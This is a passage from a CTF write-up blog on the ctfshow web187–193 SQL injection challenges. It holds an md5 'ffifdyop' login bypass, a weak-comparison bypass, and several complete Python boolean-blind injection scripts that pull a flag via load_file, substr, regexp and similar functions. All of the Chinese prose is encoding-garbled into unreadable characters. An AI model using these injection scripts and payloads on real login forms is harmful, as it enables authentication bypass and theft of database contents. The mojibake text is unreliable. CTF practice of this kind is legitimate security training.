punctuation">&#125;</span></code></pre><p>Â¢ûÂä†‰∫ÜÂ∞ñÊã¨Âè∑Ôºå<code>^</code>„ÄÅ<code>%</code>ÁöÑËøáÊª§„ÄÇ<br>‰∏äÈ¢òÁöÑpayloadÂèØÁî®„ÄÇ</p><h4 id="web187-ffifdyopÁªïËøámd5"><a href="#web187-ffifdyopÁªïËøámd5" class="headerlink" title="web187(ffifdyopÁªïËøámd5)"></a>web187(ffifdyopÁªïËøámd5)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÊãºÊé•sqlËØ≠Âè•Êü•ÊâæÊåáÂÆöIDÁî®Êà∑</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>      </code></pre><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Âè™ÊúâadminÂèØ‰ª•Ëé∑Âæóflag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑Âêç‰∏çÂ≠òÂú®'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><p><img src="web187.png" loading="lazy"></p><p><strong>ffifdyop||129581926211651571912466741651878684928</strong></p><p>ÁªèËøámd5Âä†ÂØÜÂêéÔºö276f722736c95d99e921722cf9ed621c</p><p>ÂÜçËΩ¨Êç¢‰∏∫Â≠óÁ¨¶‰∏≤Ôºö‚Äôor‚Äô6&lt;‰π±Á†Å&gt; Âç≥  <code>&#39;or&#39;66ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩb</code></p><h4 id="web188-Âº±ÊØîËæÉ"><a href="#web188-Âº±ÊØîËæÉ" class="headerlink" title="web188(&#x3D;&#x3D;Âº±ÊØîËæÉ)"></a>web188(&#x3D;&#x3D;Âº±ÊØîËæÉ)</h4><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Áî®Êà∑ÂêçÊ£ÄÊµã</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ÂØÜÁ†ÅÊ£ÄÊµã</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÂØÜÁ†ÅÂè™ËÉΩ‰∏∫Êï∞Â≠ó'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ÂØÜÁ†ÅÂà§Êñ≠</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÁôªÈôÜÊàêÂäü'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    </code></pre><p>payloadÊòØÔºö<code>username=0 password=0</code></p><p>Âú®ÊØîËæÉÊü•ËØ¢ÁöÑÊó∂ÂÄôÔºåÊü•ËØ¢ËØ≠Âè•‰∏∫Ôºö<code>select pass from ctfshow_user where username = 0 and password = 0;</code>ÔºåÁî±‰∫é<code>username password</code>ÊòØÂ≠óÁ¨¶‰∏≤ÔºåÂº±ÊØîËæÉÊàê‰∫Ü0,0&#x3D;0ÊàêÁ´ãÔºåÊâÄÊù°‰ª∂Â∞±ÊàêÁ´ã‰∫ÜÔºõÊúÄÂêéÊü•ËØ¢ËØ≠Âè•Â∞±Êàê‰∫ÜÔºö<code>select pass from ctfshow_user where 1;</code></p><p>[<img src="web188.png" loading="lazy"></p><h4 id="web189-locate-load-file"><a href="#web189-locate-load-file" class="headerlink" title="web189(locate load_file)"></a>web189(locate load_file)</h4><p><strong>Hint</strong>ÔºöflagÂú®api&#x2F;index.phpÊñá‰ª∂‰∏≠</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Áî®Êà∑ÂêçÊ£ÄÊµã</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ÂØÜÁ†ÅÊ£ÄÊµã</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÂØÜÁ†ÅÂè™ËÉΩ‰∏∫Êï∞Â≠ó'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ÂØÜÁ†ÅÂà§Êñ≠</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ÁôªÈôÜÊàêÂäü'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   </code></pre><p>Ê†πÊçÆÊèêÁ§∫ÔºåÂÖàÂà©Áî®locateÂÆö‰ΩçflagÁöÑ‰ΩçÁΩÆÔºåÁÑ∂Âêé‰ΩøÁî®Áõ≤Ê≥®Êù•ÂæóÂà∞flag</p><blockquote><p>LOCATE(Â≠óÁ¨¶‰∏≤1,Â≠óÁ¨¶‰∏≤2)</p><p>ËøîÂõûÂ≠óÁ¨¶‰∏≤1Âú®Â≠óÁ¨¶‰∏≤2‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºåÂè™Ë¶ÅÂ≠óÁ¨¶‰∏≤2‰∏≠ÂåÖÂê´Â≠óÁ¨¶‰∏≤1ÔºåÈÇ£‰πàËøîÂõûÂÄºÂøÖÁÑ∂Â§ß‰∫é0„ÄÇ</p></blockquote><blockquote><p>username&#x3D;0„ÄÅpassword&#x3D;0Êó∂ÔºåËøîÂõû‚ÄúÂØÜÁ†ÅÈîôËØØ‚Äù„ÄÇÔºàËØ¥ÊòéÂ≠òÂú®Áî®Êà∑Ôºå‰ΩÜÊòØÂØÜÁ†ÅÈîôËØØÔºâ<br>username&#x3D;1„ÄÅpassword&#x3D;0Êó∂ÔºåËøîÂõû‚ÄúÊü•ËØ¢Â§±Ë¥•‚Äù„ÄÇÔºàËØ¥ÊòéÁî®Êà∑‰∏çÂ≠òÂú®Ôºâ</p></blockquote><p>ÂèØ‰ª•Âà©Áî®‰ª•‰∏äËøîÂõûÊÉÖÂÜµÊù•ËøõË°åifÈÄêÂ≠óÁ¨¶Áõ≤Ê≥®</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://deb43701-a2f5-42bf-817a-f374b486bcdf.challenge.ctf.show/api/'</span><span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">1</span>    tail <span class="token operator">=</span> <span class="token number">300</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow&#123;',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))>&#123;&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"ÂØÜÁ†ÅÈîôËØØ"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">return</span> mid<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        head <span class="token operator">=</span> <span class="token number">32</span>        tail <span class="token operator">=</span> <span class="token number">127</span>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),&#123;0&#125;,1))>&#123;1&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>            <span class="token punctuation">&#125;</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"ÂØÜÁ†ÅÈîôËØØ"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tail <span class="token operator">=</span> mid            <span class="token comment"># mid += 1</span>        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    mid <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>    getFlag<span class="token punctuation">(</span>mid<span class="token punctuation">)</span></code></pre><p>ËøòÊúâ‰∏Ä‰∏™Ê≤°ÊúâÈááÁî®‰∫åÂàÜÁÆóÊ≥ïÁöÑ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;&lt;>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#Ëøô‰∏™‰ΩçÁΩÆÔºåÊòØÁæ§‰∏ªËÄóË¥πÂæàÈïøÊó∂Èó¥Ë∑ëÂá∫Êù•ÁöÑ‰ΩçÁΩÆ~</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(substr(load_file('/var/www/html/api/index.php'),&#123;&#125;,1)=('&#123;&#125;'),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># 8d25ÊòØusername=1Êó∂ÁöÑÈ°µÈù¢ËøîÂõûÂÜÖÂÆπÂåÖÂê´ÁöÑÔºåÂÖ∑‰ΩìÂèØ‰ª•Áúã‰∏äÈù¢ÁöÑÊà™Âõæ~</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8d25"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">+=</span>x<span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web190-Â∏∏ËßÑbool-blind"><a href="#web190-Â∏∏ËßÑbool-blind" class="headerlink" title="web190(Â∏∏ËßÑbool blind)"></a>web190(Â∏∏ËßÑbool blind)</h4><p>ËæìÂÖ• admin&#x2F;123 ËæìÂá∫ÂØÜÁ†ÅÈîôËØØ</p><p>ËæìÂÖ• test&#x2F;123 ËæìÂá∫Áî®Êà∑Âêç‰∏çÂ≠òÂú®</p><p>ËØ¥ÊòéÂ≠òÂú®Ë¥¶Âè∑ admin</p><hr><p>ËæìÂÖ• admin‚Äô and 1&#x3D;1 # ËæìÂá∫ÂØÜÁ†ÅÈîôËØØ</p><p>ËæìÂÖ• admin‚Äô and 1&#x3D;2 # ËæìÂá∫Áî®Êà∑Âêç‰∏çÂ≠òÂú®</p><p>ËØ¥ÊòéÂ≠òÂú®Â∏ÉÂ∞îÁõ≤Ê≥®ÁöÑÊù°‰ª∂</p><hr><p>pass ÈïøÂ∫¶‰∏∫5 ÂÄº‰∏∫ admin</p><p>admin‚Äô and length(pass) &#x3D; 5 #</p><p>admin‚Äô and pass &#x3D; ‚Äòadmin‚Äô #</p><p>ËØ¥Êòé flag Âπ∂‰∏çÊòØ pass ÁöÑÂÄº</p><p>Êé•‰∏ãÊù•Â∞±ÊòØÊ≠£Â∏∏ÁöÑÁõ≤Ê≥®</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://55202cb2-6c46-4248-a593-31a004489e2a.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Êï∞ÊçÆÂ∫ì  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•Â≠óÊÆµ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select f1ag from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin' and if(ascii(substr((&#123;0&#125;),&#123;1&#125;,1))>&#123;2&#125;,1,2)='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ÂØÜÁ†ÅÈîôËØØ"</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web191-ord"><a href="#web191-ord" class="headerlink" title="web191(ord)"></a>web191(ord)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:ÊÑüËßâÂ∞ë‰∫Ü‰∏™Âï•ÔºåÂ•áÊÄ™</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>ban‰∫ÜasciiÔºåÂèØ‰ª•‰ΩøÁî®ord</p><h4 id="web192-regexp"><a href="#web192-regexp" class="headerlink" title="web192(regexp)"></a>web192(regexp)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:ÊÑüËßâÂ∞ë‰∫Ü‰∏™Âï•ÔºåÂ•áÊÄ™</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'Áî®Êà∑ÂêçÈùûÊ≥ï'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>ord</code> <code>hex</code>ÈÉΩË¢´ban‰∫Ü</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">'https://672395a7-518e-4be5-b990-8af1ef5202c4.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment"># Êü•Êï∞ÊçÆÂ∫ì  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•Â≠óÊÆµ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ÂØÜÁ†ÅÈîôËØØ"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web193-left-right"><a href="#web193-left-right" class="headerlink" title="web193(left right)"></a>web193(left right)</h4><p>ËøáÊª§‰∫Ü<code>file|into|ascii|ord|hex|substr</code>ÔºåsubstrÊ≤°‰∫ÜÔºåÂèØ‰ª•Áî®<code>left() 